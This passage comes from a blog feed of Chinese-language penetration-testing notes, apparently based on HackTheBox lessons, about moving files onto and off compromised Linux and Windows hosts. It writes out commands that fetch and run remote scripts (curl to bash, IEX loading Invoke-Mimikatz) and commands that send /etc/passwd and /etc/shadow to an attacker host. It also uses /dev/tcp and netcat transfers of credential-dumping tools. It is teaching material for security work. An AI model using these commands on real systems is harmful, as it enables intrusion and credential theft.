-p 8000 &gt; SharpKatz.exe</code></pre><p>如果被破坏的机器正在使用Ncat，我们只需要指定–recv-only来在文件传输完成后关闭连接。</p><pre><code class="shell-session">victim@target:~$ ncat -l -p 8000 --recv-only &gt; SharpKatz.exe</code></pre><p>从我们的攻击主机，我们将使用Netcat连接到端口8000上的受损机器，并将文件SharpKatz.exe作为输入发送到Netcat。选项-q0将告诉Netcat在连接完成后关闭连接。这样，我们就可以知道文件传输何时完成。</p><pre><code class="shell-session">Tanin@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exeTanin@htb[/htb]$ # Example using Original NetcatTanin@htb[/htb]$ nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe</code></pre><p>通过在我们的攻击主机上使用Ncat，我们可以选择–send-only而不是-q。当在连接和侦听模式中都使用–send-only标志时，一旦Ncat的输入耗尽，就会提示其终止。通常，Ncat会继续运行，直到网络连接关闭，因为远程侧可能会传输额外的数据。但是，使用–send-only，不需要预测更多传入信息。</p><pre><code class="shell-session"> ncat --send-only 192.168.49.128 8000 &lt; SharpKatz.exe</code></pre><p>如果我们的受损机器上没有Netcat或Ncat，Bash支持在伪设备文件&#x2F;dev&#x2F;TCP&#x2F;上进行读&#x2F;写操作。 写入这个特定的文件会使Bash打开到host:port的TCP连接，并且这个功能可以用于文件传输。</p><h4 id="NetCat-Sending-File-as-Input-to-Netcat"><a href="#NetCat-Sending-File-as-Input-to-Netcat" class="headerlink" title="NetCat - Sending File as Input to Netcat"></a>NetCat - Sending File as Input to Netcat</h4><pre><code class="shell-session">Tanin@htb[/htb]$ # Example using Original NetcatTanin@htb[/htb]$ sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe</code></pre><h4 id="NetCat-Sending-File-as-Input-to-Netcat-1"><a href="#NetCat-Sending-File-as-Input-to-Netcat-1" class="headerlink" title="NetCat - Sending File as Input to Netcat"></a>NetCat - Sending File as Input to Netcat</h4><pre><code class="shell-session">Tanin@htb[/htb]$ # Example using NcatTanin@htb[/htb]$ sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe</code></pre><h4 id="Compromised-Machine-Connecting-to-Netcat-Using-x2F-dev-x2F-tcp-to-Receive-the-File"><a href="#Compromised-Machine-Connecting-to-Netcat-Using-x2F-dev-x2F-tcp-to-Receive-the-File" class="headerlink" title="Compromised Machine Connecting to Netcat Using &#x2F;dev&#x2F;tcp to Receive the File"></a>Compromised Machine Connecting to Netcat Using &#x2F;dev&#x2F;tcp to Receive the File</h4><pre><code class="shell-session">victim@target:~$ cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux_File_Transfer</title>
      <link href="/2023/07/06/Linux-File-Transfer/"/>
      <url>/2023/07/06/Linux-File-Transfer/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Downloads-with-Wget-and-cURL"><a href="#Web-Downloads-with-Wget-and-cURL" class="headerlink" title="Web Downloads with Wget and cURL"></a>Web Downloads with Wget and cURL</h2><p>Linux发行版中与web应用程序交互的两个最常见的实用程序是wget和curl。这些工具安装在许多Linux发行版上。 要使用wget下载文件，我们需要指定URL和选项“-O”来设置输出文件名。</p><span id="more"></span><h4 id="Download-a-File-Using-wget"><a href="#Download-a-File-Using-wget" class="headerlink" title="Download a File Using wget"></a>Download a File Using wget</h4><pre><code class="shell-session">Tanin@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></pre><p>cURL与wget非常相似，但输出文件名选项是小写的“-o”。</p><pre><code class="shell-session">Tanin@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></pre><h2 id="Fileless-Attacks-Using-Linux"><a href="#Fileless-Attacks-Using-Linux" class="headerlink" title="Fileless Attacks Using Linux"></a>Fileless Attacks Using Linux</h2><p>由于Linux的工作方式和管道的操作方式，我们在Linux中使用的大多数工具都可以用于复制无文件操作，这意味着我们不必下载文件来执行它。</p><p>注意：一些有效负载（如mkfifo）会将文件写入磁盘。请记住，虽然使用管道时有效负载的执行可能是无文件的，但根据所选的有效负载，它可能会在操作系统上创建临时文件。</p><p>让我们使用我们使用的cURL命令，而不是下载LinEnum.sh，让我们使用管道直接执行它。</p><pre><code class="shell-session">Tanin@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash</code></pre><p>类似地，我们可以从web服务器下载一个Python脚本文件，并将其管道传输到Python二进制文件中。让我们这样做，这次使用wget。</p><h4 id="Fileless-Download-with-wget"><a href="#Fileless-Download-with-wget" class="headerlink" title="Fileless Download with wget"></a>Fileless Download with wget</h4><pre><code class="shell-session">Tanin@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3Hello World!</code></pre><ul><li><code>wget -qO- &lt;URL&gt;</code>：使用 <code>wget</code> 命令下载指定 URL 的文件，并将其输出到标准输出（stdout）而不保存到文件。<code>-q</code> 参数表示静默模式，不显示下载进度信息，<code>-O-</code> 参数指定将文件内容输出到 stdout。</li><li><code>|</code>：管道操作符，将前一个命令的输出作为后一个命令的输入。</li><li><code>python3</code>：Python 3 解释器，用于执行从标准输入接收到的 Python 代码。</li></ul><h2 id="Download-with-Bash-x2F-dev-x2F-tcp"><a href="#Download-with-Bash-x2F-dev-x2F-tcp" class="headerlink" title="Download with Bash (&#x2F;dev&#x2F;tcp)"></a>Download with Bash (&#x2F;dev&#x2F;tcp)</h2><p>也可能存在没有任何已知的文件传输工具可用的情况。只要安装了Bash 2.04或更高版本（使用–enable net redirections编译），内置的&#x2F;dev&#x2F;TCP设备文件就可以用于简单的文件下载。</p><pre><code class="shell-session">Tanin@htb[/htb]$ exec 3&lt;&gt;/dev/tcp/10.10.10.32/80</code></pre><h4 id="Connect-to-the-Target-Webserver"><a href="#Connect-to-the-Target-Webserver" class="headerlink" title="Connect to the Target Webserver"></a>Connect to the Target Webserver</h4><ul><li><code>exec 3&lt;&gt;/dev/tcp/10.10.10.32/80</code>：<code>exec</code> 是 Bash 的一个内置命令，用于执行重定向或替换文件描述符等操作。在这里，它将文件描述符 3（可以是任何可用的未使用文件描述符）与指定的 IP 地址和端口号上的 TCP 连接相关联。</li><li><code>/dev/tcp/10.10.10.32/80</code>：<code>/dev/tcp/</code> 是 Bash 的特殊设备文件路径之一，可以用于与 TCP 服务器建立连接。在这里，它表示与 IP 地址为 <code>10.10.10.32</code>，端口号为 <code>80</code> 的服务器建立连接。</li></ul><h4 id="HTTP-GET-Request"><a href="#HTTP-GET-Request" class="headerlink" title="HTTP GET Request"></a>HTTP GET Request</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo -e &quot;GET /LinEnum.sh HTTP/1.1\n\n&quot;&gt;&amp;3</code></pre><h4 id="Print-the-Response"><a href="#Print-the-Response" class="headerlink" title="Print the Response"></a>Print the Response</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat &lt;&amp;3</code></pre><h2 id="SSH-Downloads"><a href="#SSH-Downloads" class="headerlink" title="SSH Downloads"></a>SSH Downloads</h2><p>SSH（或Secure Shell）是一种允许安全访问远程计算机的协议。SSH实现附带了一个用于远程文件传输的SCP实用程序，默认情况下，该实用程序使用SSH协议。 SCP（安全复制）是一种命令行实用程序，允许您在两个主机之间安全地复制文件和目录。我们可以将文件从本地服务器复制到远程服务器，也可以从远程服务器复制到本地机器。 SCP与copy或cp非常相似，但我们需要指定用户名、远程IP地址或DNS名称以及用户的凭据，而不是提供本地路径。 在我们开始将文件从目标Linux机器下载到Pwnbox之前，让我们在Pwnbox中设置一个SSH服务器。</p><h4 id="Enabling-the-SSH-Server"><a href="#Enabling-the-SSH-Server" class="headerlink" title="Enabling the SSH Server"></a>Enabling the SSH Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo systemctl enable sshSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.Executing: /lib/systemd/systemd-sysv-install enable sshUse of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, &lt;DATA&gt; line 45...SNIP...</code></pre><h4 id="Starting-the-SSH-Server"><a href="#Starting-the-SSH-Server" class="headerlink" title="Starting the SSH Server"></a>Starting the SSH Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo systemctl start ssh</code></pre><h4 id="Checking-for-SSH-Listening-Port"><a href="#Checking-for-SSH-Listening-Port" class="headerlink" title="Checking for SSH Listening Port"></a>Checking for SSH Listening Port</h4><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -lnpt(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - </code></pre><p>现在我们可以开始传输文件了。我们需要指定我们Pwnbox的IP地址以及用户名和密码。</p><h4 id="Linux-Downloading-Files-Using-SCP"><a href="#Linux-Downloading-Files-Using-SCP" class="headerlink" title="Linux - Downloading Files Using SCP"></a>Linux - Downloading Files Using SCP</h4><pre><code class="shell-session">Tanin@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . </code></pre><p>注意：您可以为文件传输创建临时用户帐户，并避免在远程计算机上使用主凭据或密钥。</p><h2 id="Upload-Operations"><a href="#Upload-Operations" class="headerlink" title="Upload Operations"></a>Upload Operations</h2><p>还有一些情况，如二进制利用和数据包捕获分析，我们必须将文件从目标机器上传到攻击主机上。我们用于下载的方法也适用于上传。让我们看看如何以各种方式上传文件。</p><h2 id="Web-Upload"><a href="#Web-Upload" class="headerlink" title="Web Upload"></a>Web Upload</h2><p>正如在Windows文件传输方法部分中提到的，我们可以使用uploadserver，这是Python HTTP.Server模块的扩展模块，其中包括一个文件上传页面。对于这个Linux示例，让我们看看如何将uploadserver模块配置为使用HTTPS进行安全通信。 我们需要做的第一件事是安装uploadserver模块。</p><h4 id="Pwnbox-Start-Web-Server"><a href="#Pwnbox-Start-Web-Server" class="headerlink" title="Pwnbox - Start Web Server"></a>Pwnbox - Start Web Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -m pip install --user uploadserverCollecting uploadserver  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)Installing collected packages: uploadserverSuccessfully installed uploadserver-2.0.1</code></pre><ul><li><code>python3</code>：指定要使用的 Python 版本，这里是 Python 3。</li><li><code>-m pip</code>：使用 Python 的 <code>pip</code> 模块来执行包的安装操作。</li><li><code>install</code>：告诉 <code>pip</code> 安装一个包。</li><li><code>--user</code>：将包安装到当前用户的本地目录，而不是系统级别的目录。这可以确保您的安装不会影响其他用户或需要管理员权限。</li><li><code>uploadserver</code>：要安装的包的名称，这里是 <code>uploadserver</code>。</li></ul><p>现在我们需要创建一个证书。在本例中，我们使用的是自签名证书。</p><h4 id="Pwnbox-Create-a-Self-Signed-Certificate"><a href="#Pwnbox-Create-a-Self-Signed-Certificate" class="headerlink" title="Pwnbox - Create a Self-Signed Certificate"></a>Pwnbox - Create a Self-Signed Certificate</h4><pre><code class="shell-session">Tanin@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj &#39;/CN=server&#39;Generating a RSA private key................................................................................+++++.......+++++writing new private key to &#39;server.pem&#39;-----</code></pre><ul><li><code>req</code>: OpenSSL 的子命令，用于处理证书签发请求。</li><li><code>-x509</code>: 生成自签名的 X.509 证书。</li><li><code>-out server.pem</code>: 指定生成的证书的输出路径和文件名。</li><li><code>-keyout server.pem</code>: 指定生成的私钥的输出路径和文件名。</li><li><code>-newkey rsa:2048</code>: 创建一个新的 RSA 密钥对，密钥长度为 2048 位。</li><li><code>-nodes</code>: 生成的私钥不加密（无密码）。</li><li><code>-sha256</code>: 使用 SHA-256 哈希算法生成证书请求的摘要。</li><li><code>-subj &#39;/CN=server&#39;</code>: 指定证书的主题（Subject），在这里是 Common Name (CN) 设置为 “server”。</li></ul><h4 id="Pwnbox-Start-Web-Server-1"><a href="#Pwnbox-Start-Web-Server-1" class="headerlink" title="Pwnbox - Start Web Server"></a>Pwnbox - Start Web Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -m uploadserver 443 --server-certificate /root/server.pemFile upload available at /uploadServing HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...</code></pre><p>现在，让我们从受损的机器上传&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F &#39;files=@/etc/passwd&#39; -F &#39;files=@/etc/shadow&#39; --insecure</code></pre><p>我们使用了不安全的选项，因为我们使用了我们信任的自签名证书。</p><h2 id="Alternative-Web-File-Transfer-Method"><a href="#Alternative-Web-File-Transfer-Method" class="headerlink" title="Alternative Web File Transfer Method"></a>Alternative Web File Transfer Method</h2><p>由于Linux发行版通常安装了Python或php，因此启动web服务器传输文件非常简单。此外，如果我们泄露的服务器是网络服务器，我们可以将要传输的文件移动到网络服务器目录，并从网页访问它们，这意味着我们正在从我们的Pwnbox下载文件。 可以使用各种语言来建立web服务器。受损的Linux计算机可能没有安装web服务器。在这种情况下，我们可以使用迷你网络服务器。它们可能缺乏安全性，但它们弥补了灵活性，因为webroot位置和侦听端口可以快速更改。</p><h4 id="Linux-Creating-a-Web-Server-with-Python3"><a href="#Linux-Creating-a-Web-Server-with-Python3" class="headerlink" title="Linux - Creating a Web Server with Python3"></a>Linux - Creating a Web Server with Python3</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><h4 id="Linux-Creating-a-Web-Server-with-Python2-7"><a href="#Linux-Creating-a-Web-Server-with-Python2-7" class="headerlink" title="Linux - Creating a Web Server with Python2.7"></a>Linux - Creating a Web Server with Python2.7</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python2.7 -m SimpleHTTPServerServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><h4 id="Linux-Creating-a-Web-Server-with-PHP"><a href="#Linux-Creating-a-Web-Server-with-PHP" class="headerlink" title="Linux - Creating a Web Server with PHP"></a>Linux - Creating a Web Server with PHP</h4><pre><code class="shell-session">Tanin@htb[/htb]$ php -S 0.0.0.0:8000[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started</code></pre><h4 id="Linux-Creating-a-Web-Server-with-Ruby"><a href="#Linux-Creating-a-Web-Server-with-Ruby" class="headerlink" title="Linux - Creating a Web Server with Ruby"></a>Linux - Creating a Web Server with Ruby</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ruby -run -ehttpd . -p8000[2022-05-23 09:35:46] INFO  WEBrick 1.6.1[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu][2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000</code></pre><h4 id="Download-the-File-from-the-Target-Machine-onto-the-Pwnbox"><a href="#Download-the-File-from-the-Target-Machine-onto-the-Pwnbox" class="headerlink" title="Download the File from the Target Machine onto the Pwnbox"></a>Download the File from the Target Machine onto the Pwnbox</h4><pre><code class="shell-session">Tanin@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt</code></pre><h2 id="SCP-Upload"><a href="#SCP-Upload" class="headerlink" title="SCP Upload"></a>SCP Upload</h2><p>我们可能会发现一些公司允许SSH协议（TCP&#x2F;22）用于出站连接，如果是这样的话，我们可以使用带有scp实用程序的SSH服务器来上传文件。让我们尝试使用SSH协议上传一个文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/plaintext@192.168.49.128&#39;s password: passwd              </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows_File_Transfer</title>
      <link href="/2023/07/04/Windows-File-Transfer/"/>
      <url>/2023/07/04/Windows-File-Transfer/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><span id="more"></span><p>Windows操作系统在过去几年中不断发展，新版本为文件传输操作提供了不同的实用程序。了解Windows中的文件传输可以帮助攻击者和防御者。攻击者可以使用各种文件传输方法进行操作，避免被捕获。防御者可以了解这些方法是如何监控和创建相应的策略以避免被泄露的。让我们使用 <a href="https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/">Microsoft Astaroth Attack</a> 博客文章作为高级持续威胁（APT）的例子。 这篇博客文章一开始就谈到了无文件威胁<a href="https://docs.microsoft.com/en-us/microsoft-365/security/intelligence/fileless-threats?view=o365-worldwide">fileless threats</a>。“无文件”一词表示威胁不是来自文件，而是使用系统中内置的合法工具来执行攻击。这并不意味着没有文件传输操作。如本节稍后所述，该文件不“存在”于系统中，而是在内存中运行。 Astaroth攻击通常遵循以下步骤：鱼叉式网络钓鱼电子邮件中的恶意链接导致LNK文件。双击时，LNK文件导致使用“&#x2F;Format”参数执行WMIC工具（ <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic">WMIC tool</a>），从而允许下载和执行恶意JavaScript代码。反过来，JavaScript代码通过滥用Bitsadmin工具（<a href="https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool">Bitsadmin tool</a>）来下载有效载荷。 所有有效载荷都使用Certutil工具进行了base64编码和解码，生成了一些DLL文件。然后使用regsvr32工具（ <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32">regsvr32</a>）加载其中一个解码的DLL，该DLL解密并加载其他文件，直到最终的有效负载Astaroth被注入到Userinit进程中。下面是攻击的图形描述。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307041002879.png" alt="image"></p><p>这是一个很好的例子，说明了文件传输的多种方法以及威胁行为者使用这些方法绕过防御。 本节将讨论使用一些本机Windows工具进行下载和上载操作。在本模块的后面，我们将讨论Windows和Linux上的Living Off the Land二进制文件，以及如何使用它们执行文件传输操作。</p><h2 id="Download-Operations"><a href="#Download-Operations" class="headerlink" title="Download Operations"></a>Download Operations</h2><h2 id="PowerShell-Base64-Encode-amp-Decode"><a href="#PowerShell-Base64-Encode-amp-Decode" class="headerlink" title="PowerShell Base64 Encode &amp; Decode"></a>PowerShell Base64 Encode &amp; Decode</h2><p>根据我们想要传输的文件大小，我们可以使用不需要网络通信的不同方法。如果我们可以访问终端，我们可以将文件编码为base64字符串，从终端复制其内容并执行反向操作，解码原始内容中的文件。让我们看看如何使用PowerShell实现这一点。 使用此方法的一个重要步骤是确保编码和解码的文件是正确的。我们可以使用md5sum，一个计算和验证128位MD5校验和的程序。MD5散列的作用是文件的紧凑数字指纹，这意味着一个文件在任何地方都应该有相同的MD5散列。让我们尝试传输一个示例ssh密钥。它可以是其他任何东西，从我们的Pwnbox到Windows目标。</p><h4 id="Pwnbox-Check-SSH-Key-MD5-Hash"><a href="#Pwnbox-Check-SSH-Key-MD5-Hash" class="headerlink" title="Pwnbox Check SSH Key MD5 Hash"></a>Pwnbox Check SSH Key MD5 Hash</h4><pre><code class="shell-session">Tanin@htb[/htb]$ md5sum id_rsa4e301756a07ded0a2dd6953abf015278  id_rsa</code></pre><h4 id="Pwnbox-Encode-SSH-Key-to-Base64"><a href="#Pwnbox-Encode-SSH-Key-to-Base64" class="headerlink" title="Pwnbox Encode SSH Key to Base64"></a>Pwnbox Encode SSH Key to Base64</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat id_rsa |base64 -w 0;echoLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS    //&lt;snip&gt;</code></pre><p><code>-w 0</code>:输出为一行</p><p>我们可以复制此内容并将其粘贴到Windows PowerShell终端中，然后使用一些PowerShell函数对其进行解码。</p><pre><code class="powershell-session">PS C:\htb&gt; [IO.File]::WriteAllBytes(&quot;C:\Users\Public\id_rsa&quot;, [Convert]::FromBase64String(&quot;LS0tLS1CR \&lt;SNIP&gt; ktLS0tLQo=&quot;))</code></pre><p>最后，我们可以使用 <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2">Get-FileHash</a> cmdlet确认文件是否成功传输，该cmdlet与md5sum执行的操作相同。</p><pre><code class="powershell-session">PS C:\htb&gt; Get-FileHash C:\Users\Public\id_rsa -Algorithm md5Algorithm       Hash                                                                   Path---------       ----                                                                   ----MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa</code></pre><h2 id="PowerShell-Web-Downloads"><a href="#PowerShell-Web-Downloads" class="headerlink" title="PowerShell Web Downloads"></a>PowerShell Web Downloads</h2><p>大多数公司都允许HTTP和HTTPS出站流量通过防火墙，以提高员工的工作效率。利用这些传输方法进行文件传输操作非常方便。尽管如此，维权者可以使用网络过滤解决方案来阻止访问特定的网站类别，阻止下载文件类型（如.exe），或者只允许访问更受限制的网络中的白名单域列表。 PowerShell提供了许多文件传输选项。在任何版本的PowerShell中， <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0">System.Net.WebClient</a>类都可以用于通过HTTP、HTTPS或FTP下载文件。下表 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0">table</a>介绍了从资源下载数据的WebClient方法：</p><table><thead><tr><th><strong>Method</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0">OpenRead</a></td><td>Returns the data from a resource as a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0">Stream</a>.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0">OpenReadAsync</a></td><td>Returns the data from a resource without blocking the calling thread.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0">DownloadData</a></td><td>Downloads data from a resource and returns a Byte array.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0">DownloadDataAsync</a></td><td>Downloads data from a resource and returns a Byte array without blocking the calling thread.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0">DownloadFile</a></td><td>Downloads data from a resource to a local file.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0">DownloadFileAsync</a></td><td>Downloads data from a resource to a local file without blocking the calling thread.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0">DownloadString</a></td><td>Downloads a String from a resource and returns a String.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0">DownloadStringAsync</a></td><td>Downloads a String from a resource without blocking the calling thread.</td></tr></tbody></table><h4 id="PowerShell-DownloadFile-Method"><a href="#PowerShell-DownloadFile-Method" class="headerlink" title="PowerShell DownloadFile Method"></a>PowerShell DownloadFile Method</h4><p>我们可以指定类名Net.WebClient和方法DownloadFile，参数对应于要下载的目标文件的URL和输出文件名。</p><pre><code class="powershell-session">PS C:\htb&gt; # Example: (New-Object Net.WebClient).DownloadFile(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)PS C:\htb&gt; (New-Object Net.WebClient).DownloadFile(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#39;,&#39;C:\Users\Public\Downloads\PowerView.ps1&#39;)PS C:\htb&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)PS C:\htb&gt; (New-Object Net.WebClient).DownloadFileAsync(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&#39;, &#39;PowerViewAsync.ps1&#39;)</code></pre><h4 id="PowerShell-DownloadString-Fileless-Method"><a href="#PowerShell-DownloadString-Fileless-Method" class="headerlink" title="PowerShell DownloadString - Fileless Method"></a>PowerShell DownloadString - Fileless Method</h4><p>正如我们之前所讨论的，无文件攻击是通过使用一些操作系统函数下载有效负载并直接执行它来工作的。PowerShell还可以用于执行无文件攻击。我们可以使用 <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2">Invoke-Expression</a>  cmdlet或别名IEX直接在内存中运行PowerShell脚本，而不是将其下载到磁盘。</p><pre><code class="powershell-session">PS C:\htb&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;)</code></pre><p>IEX还接受管道输入。</p><pre><code class="powershell-session">PS C:\htb&gt; (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;) | IEX</code></pre><h4 id="PowerShell-Invoke-WebRequest"><a href="#PowerShell-Invoke-WebRequest" class="headerlink" title="PowerShell Invoke-WebRequest"></a>PowerShell Invoke-WebRequest</h4><p>从PowerShell 3.0起， <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2">Invoke-WebRequest</a> cmdlet也可用，但下载文件的速度明显较慢。您可以使用别名iwr、curl和wget，而不是InvokeWebRequest的全名。</p><pre><code class="powershell-session">PS C:\htb&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1</code></pre><p>Harmj0y在<a href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239">here</a>整理了一个PowerShell下载支架的广泛列表。</p><h4 id="Common-Errors-with-PowerShell"><a href="#Common-Errors-with-PowerShell" class="headerlink" title="Common Errors with PowerShell"></a>Common Errors with PowerShell</h4><p>在某些情况下，Internet Explorer首次启动配置可能尚未完成，从而阻止下载。</p><p>这可以使用参数-UseBasicParsing绕过。</p><pre><code class="powershell-session">PS C:\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 | IEXInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer&#39;s first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.At line:1 char:1+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommandPS C:\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX</code></pre><p>如果证书不受信任，PowerShell下载中的另一个错误与SSL&#x2F;TLS安全通道有关。我们可以使用以下命令绕过该错误：</p><pre><code class="powershell-session">PS C:\htb&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;)Exception calling &quot;DownloadString&quot; with &quot;1&quot; argument(s): &quot;The underlying connection was closed: Could not establish trustrelationship for the SSL/TLS secure channel.&quot;At line:1 char:1+ IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubuserc ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : WebExceptionPS C:\htb&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = &#123;$true&#125;</code></pre><h2 id="SMB-Downloads"><a href="#SMB-Downloads" class="headerlink" title="SMB Downloads"></a>SMB Downloads</h2><p>在端口TCP&#x2F;445上运行的服务器消息块协议（SMB协议）在运行Windows服务的企业网络中很常见。它使应用程序和用户能够在远程服务器之间传输文件。 我们可以使用SMB轻松地从我们的Pwnbox下载文件。我们需要在我们的Pwnbox中使用Impacket中的<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">smbserver.py</a>创建一个SMB服务器，然后使用复制、移动、PowerShell复制项或任何其他允许连接到SMB的工具。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshareImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed</code></pre><p>&#x3D;&#x3D;</p><pre><code>这个命令是在Linux系统上使用impacket-smbserver工具创建一个SMB共享服务器。下面是命令的解释：sudo: sudo命令用于以超级用户或其他特权用户的身份运行命令。impacket-smbserver: impacket-smbserver是一个基于Impacket库的工具，用于创建和模拟SMB（Server Message Block）服务器。share: share是你给共享服务器起的名称，可以根据需要自定义。-smb2support: 